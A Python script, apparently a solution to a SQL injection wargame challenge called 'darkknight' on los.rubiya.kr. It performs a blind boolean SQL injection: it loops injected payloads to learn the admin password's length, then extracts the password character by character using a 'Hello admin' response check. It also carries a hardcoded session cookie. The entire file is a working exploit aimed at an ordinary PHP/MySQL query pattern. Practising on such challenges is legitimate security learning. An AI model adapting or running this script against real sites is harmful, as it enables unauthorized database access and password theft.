import urllib.parse as urllib
import urllib.request as urllib2
import sys
import time
import requests
leng = 0

for i in range(1, 100):
    payload= "0 or id like \"admin\" and length(pw) like " + str(i) + "#"
    #print (payload)
    payload = urllib.quote(payload)
    url = "https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php?no="+payload
    opener = urllib2.build_opener(urllib2.HTTPHandler)
    request = urllib2.Request(url)
    request.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36')
    request.add_header('Cookie', 'PHPSESSID=fj1a9mg2u3bkn3gnaq4gu7t0hh')
    request.get_method = lambda:'GET'
    data = opener.open(request)
    data = data.read()
    if bytes("Hello admin", 'utf-8') in data:
        #print("len: ", str(i))
        leng = i
        break
    else: 
        pass

    #time.sleep(0.2)
print(leng)


key = ""
print (leng)
for i in range(1, leng+1):
    for j in range(48,122):
        
        payload = "1 || id like \"admin\" && ord(mid(pw, {}, 1)) like {} #".format(i, j)
        payload = urllib.quote(payload)
        url = "https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php?no="+payload

        opener = urllib2.build_opener(urllib2.HTTPHandler)
        request = urllib2.Request(url)
        request.add_header('Cookie', 'PHPSESSID=fj1a9mg2u3bkn3gnaq4gu7t0hh')
        request.get_method = lambda:'GET'
        data = opener.open(request)
        data = data.read()

        if bytes("Hello admin", 'utf-8') in data:
            print("Password: ",chr(j))
            key += chr(j)
            break
        
        time.sleep(0.2) 
print(key)